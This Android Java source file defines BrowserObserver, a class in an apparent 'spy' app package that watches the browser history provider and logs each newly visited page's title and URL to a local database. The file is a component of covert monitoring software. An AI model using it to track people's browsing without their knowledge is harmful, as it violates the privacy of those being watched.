package edu.uj.jkordas.spy.receiver;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.Browser;
import android.util.Log;

import edu.uj.jkordas.spy.DAO.BrowserHistoryDataSource;

public class BrowserObserver extends ContentObserver {
	private Context context = null;
	private String lastTitle;
	public static Uri BOOKMARKS_URI = Browser.BOOKMARKS_URI;

	public BrowserObserver(Handler handler, Context context) {
		super(handler);
		this.context = context;
	}

	@Override
	public void onChange(boolean selfChange) {
		onChange(selfChange, null);
	}

	@Override
	public void onChange(boolean selfChange, Uri uri) {
		super.onChange(selfChange);

		String[] proj = new String[] { Browser.BookmarkColumns.TITLE,
				Browser.BookmarkColumns.URL };
		String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history

		Cursor cur = context.getContentResolver().query(BOOKMARKS_URI, proj,
				sel, null, null);

		if (cur != null) {
			if (cur.moveToLast()) {

				String currentTitle = cur.getString(cur
						.getColumnIndex(Browser.BookmarkColumns.TITLE));
				if (!currentTitle.equals(lastTitle)) {

					String url = cur.getString(cur
							.getColumnIndex(Browser.BookmarkColumns.URL));

					BrowserHistoryDataSource datasource = new BrowserHistoryDataSource(
							context);
					datasource.open();

					datasource.addVisitedPage(currentTitle, url);
					datasource.close();
				}

				this.lastTitle = currentTitle;
			}

		} else {
			Log.e("BROWSER_OBSERVER", "Call Cursor is Empty");
		}
	}
}
